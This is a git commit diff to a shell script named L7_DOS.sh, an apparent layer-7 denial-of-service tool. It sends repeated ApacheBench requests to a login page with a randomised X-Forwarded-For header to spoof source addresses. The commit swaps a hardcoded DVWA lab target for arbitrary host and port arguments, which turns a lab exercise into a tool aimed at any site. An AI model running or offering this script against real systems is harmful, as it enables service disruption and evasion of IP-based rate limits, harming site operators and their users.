d87959bdf137e308d0665ee469f5d01d4f9dfac9
root <root@localhost.localdomain>
2021-02-17 17:48:16 +0000

    updated L7dos

--- L7_DOS.sh
+++ L7_DOS.sh
@@ -12,4 +12,4 @@ host=$1
 port=$2
 
 xff="$((RANDOM % 256))"."$((RANDOM % 256))"."$((RANDOM % 256))"."$((RANDOM % 256))"
-ab -c2 -n1000 -H "X-Forwarded-For: $xff" http://secure.dvwa.com:8081/login.php
+ab -c2 -n1000 -H "X-Forwarded-For: $xff" http://$host:$port/login.php
